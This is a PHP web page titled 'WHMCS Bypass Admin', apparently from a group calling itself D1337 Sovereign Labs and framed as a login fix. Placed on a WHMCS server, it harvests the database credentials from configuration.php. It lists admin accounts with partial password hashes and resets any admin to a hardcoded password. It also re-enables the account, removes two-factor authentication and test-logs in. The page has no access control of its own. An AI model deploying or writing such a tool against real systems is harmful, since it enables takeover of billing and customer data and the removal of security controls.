<?php
/**
 * WHMCS Login Fix Script - WHMCS 8.13.0
 * D1337 SOVEREIGN LABS
 * Auto-grabs DB credentials from WHMCS configuration.php
 */

// Auto-detect WHMCS configuration file
$config_locations = [
    __DIR__ . '/../configuration.php',           // If script is in admin/
    __DIR__ . '/configuration.php',              // If script is in root WHMCS dir
    __DIR__ . '/../../configuration.php',        // If script is deeper
    dirname(dirname(__FILE__)) . '/configuration.php',
];

$config_file = null;
foreach ($config_locations as $loc) {
    if (file_exists($loc) && is_readable($loc)) {
        $config_file = $loc;
        break;
    }
}

// Parse WHMCS configuration
if ($config_file) {
    $config_content = file_get_contents($config_file);
    
    // Extract database credentials using regex
    preg_match('/\$db_host\s*=\s*["\']([^"\']+)["\']/', $config_content, $host_match);
    preg_match('/\$db_username\s*=\s*["\']([^"\']+)["\']/', $config_content, $user_match);
    preg_match('/\$db_password\s*=\s*["\']([^"\']+)["\']/', $config_content, $pass_match);
    preg_match('/\$db_name\s*=\s*["\']([^"\']+)["\']/', $config_content, $name_match);
    
    $db_host = $host_match[1] ?? 'localhost';
    $db_user = $user_match[1] ?? '';
    $db_pass = $pass_match[1] ?? '';
    $db_name = $name_match[1] ?? '';
    
    define('DB_HOST', $db_host);
    define('DB_USER', $db_user);
    define('DB_PASS', $db_pass);
    define('DB_NAME', $db_name);
    define('CONFIG_FOUND', true);
    define('CONFIG_PATH', $config_file);
} else {
    // Fallback to manual (for backward compatibility)
    define('DB_HOST', 'localhost');
    define('DB_USER', 'whmcs_user');
    define('DB_PASS', 'whmcs_pass');
    define('DB_NAME', 'whmcs_db');
    define('CONFIG_FOUND', false);
    define('CONFIG_PATH', 'NOT FOUND');
}

// ============================================================
// 🔑 CHANGE PASSWORD HERE (line 55) - ALL forms auto-update!
// ============================================================
$new_password = 'Kontolodon123@';

?>
<!DOCTYPE html>
<html>
<head>
    <title>WHMCS Bypass Admin</title>
    <style>
        body { font-family: monospace; background: #000; color: #0f0; padding: 20px; }
        .container { max-width: 900px; margin: 0 auto; background: #111; padding: 20px; border: 1px solid #0f0; }
        h1 { color: #0f0; text-align: center; }
        .success { color: #0f0; background: #004400; padding: 10px; margin: 10px 0; }
        .error { color: #f00; background: #440000; padding: 10px; margin: 10px 0; }
        .warning { color: #ff0; background: #444400; padding: 10px; margin: 10px 0; }
        .info { background: #222; padding: 10px; margin: 10px 0; border-left: 3px solid #0f0; }
        button { background: #0f0; color: #000; padding: 10px 20px; border: none; cursor: pointer; font-weight: bold; margin: 5px; }
        button:hover { background: #0a0; }
        pre { background: #000; padding: 10px; overflow-x: auto; font-size: 12px; }
        input[type="text"], input[type="password"] { width: 100%; padding: 8px; background: #222; color: #0f0; border: 1px solid #0f0; }
    </style>
</head>
<body>
<div class="container">
    <h1>WHMCS Bypass Admin</h1>
    
    <?php
    // Show config detection status
    if (CONFIG_FOUND) {
        echo '<div class="success">';
        echo '✅ <strong>Auto-detected WHMCS configuration</strong><br>';
        echo 'Config file: <code>' . htmlspecialchars(CONFIG_PATH) . '</code><br>';
        echo 'Database: <code>' . htmlspecialchars(DB_USER) . '@' . htmlspecialchars(DB_HOST) . '/' . htmlspecialchars(DB_NAME) . '</code>';
        echo '</div>';
    } else {
        echo '<div class="error">';
        echo '❌ <strong>Could not find WHMCS configuration.php</strong><br>';
        echo 'Please edit this file and set DB credentials manually at the top.<br>';
        echo 'Searched locations:<br>';
        echo '<ul>';
        foreach ([
            __DIR__ . '/../configuration.php',
            __DIR__ . '/configuration.php',
            __DIR__ . '/../../configuration.php',
        ] as $loc) {
            echo '<li><code>' . htmlspecialchars($loc) . '</code></li>';
        }
        echo '</ul>';
        echo '</div>';
    }
    
    // Show current password setting
    echo '<div class="info">';
    echo '🔑 <strong>Default New Password:</strong> <code>' . htmlspecialchars($new_password) . '</code><br>';
    echo '<small style="color: #999;">To change: Edit line 57 in this file ($new_password = \'...\';)</small>';
    echo '</div>';
    ?>

<?php

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $action = $_POST['action'] ?? '';
    
    try {
        $conn = new mysqli(DB_HOST, DB_USER, DB_PASS, DB_NAME);
        
        if ($conn->connect_error) {
            throw new Exception("Connection failed: " . $conn->connect_error);
        }
        
        echo '<div class="success">✓ Database connected</div>';
        
        if ($action === 'diagnose') {
            echo '<h2>🔍 Diagnosing Login Issues...</h2>';
            
            // Check all admin accounts
            $result = $conn->query("SELECT id, username, email, disabled, password, passwordhash, authmodule, 
                                     loginattempts, created_at 
                                     FROM tbladmins ORDER BY id");
            
            if ($result && $result->num_rows > 0) {
                echo '<h3>📋 Admin Accounts:</h3>';
                echo '<pre>';
                while ($row = $result->fetch_assoc()) {
                    echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n";
                    echo "ID:               " . $row['id'] . "\n";
                    echo "Username:         " . $row['username'] . "\n";
                    echo "Email:            " . $row['email'] . "\n";
                    echo "Status:           " . ($row['disabled'] ? '❌ DISABLED' : '✅ ACTIVE') . "\n";
                    echo "Auth Module:      " . ($row['authmodule'] ?: 'None (Good)') . "\n";
                    echo "Login Attempts:   " . ($row['loginattempts'] ?? '0') . "\n";
                    echo "Created:          " . $row['created_at'] . "\n";
                    
                    // Check both password fields
                    echo "\nPassword Fields:\n";
                    echo "• password:       " . substr($row['password'] ?? '', 0, 50) . "...\n";
                    echo "• passwordhash:   " . substr($row['passwordhash'] ?? '', 0, 50) . "...\n";
                    
                    echo "\nHash Analysis:\n";
                    $hash = $row['password'] ?? '';
                    $hash2 = $row['passwordhash'] ?? '';
                    
                    if (!empty($hash)) {
                        if (strpos($hash, '$2y$') === 0 || strpos($hash, '$2b$') === 0 || strpos($hash, '$2a$') === 0) {
                            echo "• password field: ✓ BCrypt (Good)\n";
                        } elseif (strlen($hash) === 64) {
                            echo "• password field: ⚠️ SHA256 (OLD)\n";
                        } else {
                            echo "• password field: ❓ Unknown\n";
                        }
                    } else {
                        echo "• password field: ❌ EMPTY\n";
                    }
                    
                    if (!empty($hash2)) {
                        if (strpos($hash2, '$2y$') === 0 || strpos($hash2, '$2b$') === 0 || strpos($hash2, '$2a$') === 0) {
                            echo "• passwordhash field: ✓ BCrypt (Good)\n";
                        } elseif (strlen($hash2) === 64) {
                            echo "• passwordhash field: ⚠️ SHA256 (OLD)\n";
                        } else {
                            echo "• passwordhash field: ❓ Unknown\n";
                        }
                    } else {
                        echo "• passwordhash field: ❌ EMPTY\n";
                    }
                    
                    // Check if this account has issues
                    $issues = [];
                    if ($row['disabled']) $issues[] = '❌ Account is disabled';
                    if ($row['authmodule']) $issues[] = '⚠️ 2FA enabled (' . $row['authmodule'] . ')';
                    if (empty($row['password']) && empty($row['passwordhash'])) $issues[] = '❌ No password hash';
                    if ($row['loginattempts'] > 0) $issues[] = '⚠️ Failed login attempts';
                    
                    if (!empty($issues)) {
                        echo "\nISSUES FOUND:\n";
                        foreach ($issues as $issue) {
                            echo "  • $issue\n";
                        }
                    } else {
                        echo "\n✓ No obvious issues\n";
                    }
                }
                echo '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</pre>';
            }
            
            // Check for password field type
            echo '<h3>🗃️ Database Structure:</h3>';
            $result = $conn->query("SHOW COLUMNS FROM tbladmins");
            if ($result) {
                echo '<pre>';
                echo "Password-related columns:\n";
                while ($row = $result->fetch_assoc()) {
                    if (stripos($row['Field'], 'pass') !== false || stripos($row['Field'], 'auth') !== false) {
                        echo "• " . $row['Field'] . " (" . $row['Type'] . ")\n";
                    }
                }
                echo '</pre>';
            }
        }
        
        elseif ($action === 'fix_all') {
            $admin_id = $_POST['admin_id'] ?? 1;
            $new_pass = $_POST['new_password'] ?? $new_password;
            
            echo '<h2>🔧 Fixing Admin Account...</h2>';
            echo '<div class="info">Target Admin ID: ' . htmlspecialchars($admin_id) . '</div>';
            echo '<div class="info">New Password: ' . htmlspecialchars($new_pass) . '</div>';
            
            // Generate proper BCrypt hash (WHMCS 8.x uses this)
            $password_hash = password_hash($new_pass, PASSWORD_BCRYPT, ['cost' => 10]);
            
            echo '<div class="info">Generated Hash: <code>' . htmlspecialchars($password_hash) . '</code></div>';
            
            // Start transaction
            $conn->begin_transaction();
            
            try {
                // 1. Update BOTH password fields
                $stmt = $conn->prepare("UPDATE tbladmins SET password = ?, passwordhash = ? WHERE id = ?");
                $stmt->bind_param("ssi", $password_hash, $password_hash, $admin_id);
                $stmt->execute();
                echo '<div class="success">✓ Password updated (both password and passwordhash fields)</div>';
                
                // 2. Enable account
                $stmt = $conn->prepare("UPDATE tbladmins SET disabled = 0 WHERE id = ?");
                $stmt->bind_param("i", $admin_id);
                $stmt->execute();
                echo '<div class="success">✓ Account enabled</div>';
                
                // 3. Remove 2FA
                $stmt = $conn->prepare("UPDATE tbladmins SET authmodule = '' WHERE id = ?");
                $stmt->bind_param("i", $admin_id);
                $stmt->execute();
                echo '<div class="success">✓ Two-factor authentication disabled</div>';
                
                // 4. Reset login attempts
                $stmt = $conn->prepare("UPDATE tbladmins SET loginattempts = 0 WHERE id = ?");
                $stmt->bind_param("i", $admin_id);
                $stmt->execute();
                echo '<div class="success">✓ Login attempts reset</div>';
                
                // 5. Clear any password reset tokens (optional - column might not exist)
                try {
                    // Check if columns exist first
                    $check = $conn->query("SHOW COLUMNS FROM tbladmins LIKE 'password_reset_key'");
                    if ($check && $check->num_rows > 0) {
                        $stmt = $conn->prepare("UPDATE tbladmins SET password_reset_key = '', password_reset_expiry = '' WHERE id = ?");
                        $stmt->bind_param("i", $admin_id);
                        $stmt->execute();
                        echo '<div class="success">✓ Password reset tokens cleared</div>';
                    } else {
                        echo '<div class="warning">⚠️ Password reset columns not found (skipped)</div>';
                    }
                } catch (Exception $e) {
                    echo '<div class="warning">⚠️ Could not clear password reset tokens (non-critical): ' . htmlspecialchars($e->getMessage()) . '</div>';
                }
                
                $conn->commit();
                
                // Get final admin details
                $result = $conn->query("SELECT username, email FROM tbladmins WHERE id = $admin_id");
                if ($result && $row = $result->fetch_assoc()) {
                    // Auto-detect WHMCS admin URL
                    $protocol = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? 'https://' : 'http://';
                    $host = $_SERVER['HTTP_HOST'];
                    $current_path = dirname($_SERVER['REQUEST_URI']);
                    $admin_url = $protocol . $host . $current_path;
                    
                    // Clean up path (remove /fix.php or current script name)
                    $admin_url = str_replace(basename(__FILE__), '', $admin_url);
                    
                    // Ensure it ends with /
                    if (substr($admin_url, -1) !== '/') {
                        $admin_url .= '/';
                    }
                    
                    echo '<div class="success">';
                    echo '<h3>✅ FIXED! Login Credentials:</h3>';
                    echo '<strong>URL:</strong> <a href="' . htmlspecialchars($admin_url) . '" target="_blank">' . htmlspecialchars($admin_url) . '</a><br>';
                    echo '<strong>Username:</strong> <code>' . htmlspecialchars($row['username']) . '</code><br>';
                    echo '<strong>Password:</strong> <code>' . htmlspecialchars($new_pass) . '</code><br>';
                    echo '<br><button onclick="window.open(\'' . htmlspecialchars($admin_url) . '\', \'_blank\')">🚀 Open WHMCS Admin</button>';
                    echo '</div>';
                }
                
            } catch (Exception $e) {
                $conn->rollback();
                throw $e;
            }
        }
        
        elseif ($action === 'check_login') {
            echo '<h2>🔐 Testing Login...</h2>';
            
            $username = $_POST['test_username'] ?? 'admin';
            $password = $_POST['test_password'] ?? $new_password;
            
            echo '<div class="info">Testing: ' . htmlspecialchars($username) . '</div>';
            
            // Get admin record
            $stmt = $conn->prepare("SELECT id, password, passwordhash, disabled, authmodule FROM tbladmins WHERE username = ?");
            $stmt->bind_param("s", $username);
            $stmt->execute();
            $result = $stmt->get_result();
            
            if ($result && $row = $result->fetch_assoc()) {
                echo '<div class="success">✓ User found</div>';
                
                if ($row['disabled']) {
                    echo '<div class="error">❌ Account is DISABLED</div>';
                } else {
                    echo '<div class="success">✓ Account is enabled</div>';
                }
                
                if ($row['authmodule']) {
                    echo '<div class="warning">⚠️ 2FA enabled: ' . $row['authmodule'] . '</div>';
                } else {
                    echo '<div class="success">✓ No 2FA</div>';
                }
                
                // Test password against both fields
                echo '<div class="info">Password field: ' . substr($row['password'] ?? 'empty', 0, 40) . '...</div>';
                echo '<div class="info">Passwordhash field: ' . substr($row['passwordhash'] ?? 'empty', 0, 40) . '...</div>';
                
                $match = false;
                if (!empty($row['password']) && password_verify($password, $row['password'])) {
                    echo '<div class="success">✅ PASSWORD MATCHES (password field)!</div>';
                    $match = true;
                } elseif (!empty($row['passwordhash']) && password_verify($password, $row['passwordhash'])) {
                    echo '<div class="success">✅ PASSWORD MATCHES (passwordhash field)!</div>';
                    $match = true;
                }
                
                if (!$match) {
                    echo '<div class="error">❌ Password does NOT match either field</div>';
                } else {
                    // Actually test login to WHMCS
                    echo '<br><h3>🌐 Testing Real WHMCS Login...</h3>';
                    
                    // Auto-detect WHMCS login URL
                    $protocol = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? 'https://' : 'http://';
                    $host = $_SERVER['HTTP_HOST'];
                    $current_path = dirname($_SERVER['REQUEST_URI']);
                    $base_url = $protocol . $host . $current_path;
                    $base_url = str_replace(basename(__FILE__), '', $base_url);
                    if (substr($base_url, -1) !== '/') {
                        $base_url .= '/';
                    }
                    
                    $login_url = $base_url . 'dologin.php';
                    
                    $post_data = array(
                        'username' => $username,
                        'password' => $password,
                        'rememberme' => 'on'
                    );
                    
                    $ch = curl_init();
                    curl_setopt($ch, CURLOPT_URL, $login_url);
                    curl_setopt($ch, CURLOPT_POST, true);
                    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($post_data));
                    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
                    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
                    curl_setopt($ch, CURLOPT_HEADER, true);
                    curl_setopt($ch, CURLOPT_COOKIEJAR, '/tmp/whmcs_cookie.txt');
                    curl_setopt($ch, CURLOPT_COOKIEFILE, '/tmp/whmcs_cookie.txt');
                    
                    $response = curl_exec($ch);
                    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
                    $redirect_url = curl_getinfo($ch, CURLINFO_EFFECTIVE_URL);
                    curl_close($ch);
                    
                    echo '<div class="info">HTTP Code: ' . $http_code . '</div>';
                    echo '<div class="info">Final URL: ' . htmlspecialchars($redirect_url) . '</div>';
                    
                    // Check if login was successful
                    if (stripos($response, 'login failed') !== false || stripos($response, 'incorrect') !== false) {
                        echo '<div class="error">❌ WHMCS Login FAILED - Credentials rejected</div>';
                    } elseif (stripos($response, 'logout') !== false || stripos($redirect_url, 'admin/index.php') !== false) {
                        echo '<div class="success">✅✅✅ WHMCS Login SUCCESSFUL! You can now login!</div>';
                        echo '<div class="success">Redirect to: ' . htmlspecialchars($redirect_url) . '</div>';
                    } elseif (stripos($response, '2fa') !== false || stripos($response, 'two factor') !== false) {
                        echo '<div class="warning">⚠️ Login worked but 2FA is required</div>';
                    } else {
                        echo '<div class="warning">⚠️ Unclear result - check manually</div>';
                        echo '<pre>' . htmlspecialchars(substr($response, -500)) . '</pre>';
                    }
                }
            } else {
                echo '<div class="error">❌ User not found!</div>';
            }
        }
        
        $conn->close();
        
    } catch (Exception $e) {
        echo '<div class="error">✗ Error: ' . htmlspecialchars($e->getMessage()) . '</div>';
    }
}

?>

    <h2>🎯 Actions:</h2>
    
    <form method="POST">
        <input type="hidden" name="action" value="diagnose">
        <button type="submit">🔍 Step 1: Diagnose Login Issues</button>
    </form>
    
    <h3>🔧 Fix Admin Account:</h3>
    <form method="POST">
        <input type="hidden" name="action" value="fix_all">
        
        <label>Admin ID:</label>
        <input type="text" name="admin_id" value="1" required>
        
        <label>New Password:</label>
        <input type="password" name="new_password" value="<?php echo htmlspecialchars($new_password); ?>" required>
        
        <br><br>
        <button type="submit">🔧 Step 2: Fix Everything & Reset Password</button>
    </form>
    
    <h3>🔐 Test Login:</h3>
    <form method="POST">
        <input type="hidden" name="action" value="check_login">
        
        <label>Username:</label>
        <input type="text" name="test_username" value="admin" required>
        
        <label>Password:</label>
        <input type="password" name="test_password" value="<?php echo htmlspecialchars($new_password); ?>" required>
        
        <br><br>
        <button type="submit">🔐 Step 3: Test Login Credentials</button>
    </form>
    
    <div class="warning" style="margin-top: 20px;">
        <strong>⚠️ Instructions:</strong><br>
        1. Click "Diagnose" first to see what's wrong<br>
        2. Click "Fix Everything" to reset password + enable account + disable 2FA<br>
        3. Click "Test Login" to verify password works<br>
        4. Click the "Open WHMCS Admin" button to login<br>
        5. <strong style="color: #f00;">DELETE THIS FILE AFTER SUCCESS!</strong> (Security risk)<br>
        <br>
        <strong>💡 To change password:</strong> Edit line 57 in this file (<code>$new_password = '...';</code>)<br>
        All forms will automatically use the new password - no need to edit HTML!
    </div>
    
    <?php
    // Show current detected URLs for convenience
    $protocol = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? 'https://' : 'http://';
    $host = $_SERVER['HTTP_HOST'];
    $current_path = dirname($_SERVER['REQUEST_URI']);
    $base_url = $protocol . $host . $current_path;
    $base_url = str_replace(basename(__FILE__), '', $base_url);
    if (substr($base_url, -1) !== '/') {
        $base_url .= '/';
    }
    
    echo '<div class="info" style="margin-top: 20px;">';
    echo '<strong>📍 Auto-Detected Configuration:</strong><br>';
    echo 'WHMCS Admin: <a href="' . htmlspecialchars($base_url) . '" target="_blank">' . htmlspecialchars($base_url) . '</a><br>';
    echo 'This Script: ' . htmlspecialchars($protocol . $host . $_SERVER['REQUEST_URI']) . '<br>';
    if (CONFIG_FOUND) {
        echo 'Database: ' . htmlspecialchars(DB_USER) . '@' . htmlspecialchars(DB_HOST) . '/' . htmlspecialchars(DB_NAME) . '<br>';
        echo 'Config File: <code>' . htmlspecialchars(CONFIG_PATH) . '</code><br>';
        echo '<span style="color: #0f0;">✅ Fully automatic - no manual config needed!</span>';
    } else {
        echo '<span style="color: #f00;">❌ Manual DB config required (edit script)</span>';
    }
    echo '</div>';
    ?>
</div>
</body>
</html>
